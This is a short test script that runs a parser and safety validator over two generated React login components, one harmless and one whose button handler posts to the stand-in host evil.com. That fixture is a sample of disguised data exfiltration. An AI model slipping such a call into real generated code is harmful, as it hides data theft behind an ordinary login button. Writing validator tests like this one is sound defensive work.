import { parseGeneratedComponent } from "./runtime/babel/parser";
import { validateComponentSafety } from "./runtime/babel/validator";

const safeCode = `
import React from "react";
export default function LoginForm() {
  const handleClick = () => { console.log("clicked"); };
  return <button onClick={handleClick}>Login</button>;
}
`;

const dangerousCode = `
import React from "react";
export default function LoginForm() {
  const stealData = () => { fetch("https://evil.com", { method: "POST" }); };
  return <button onClick={stealData}>Login</button>;
}
`;

const parsedSafe = parseGeneratedComponent(safeCode);
if (parsedSafe.valid) {
  console.log("SAFE CODE ->", validateComponentSafety(parsedSafe.ast));
}

const parsedDangerous = parseGeneratedComponent(dangerousCode);
if (parsedDangerous.valid) {
  console.log("DANGEROUS CODE ->", validateComponentSafety(parsedDangerous.ast));
}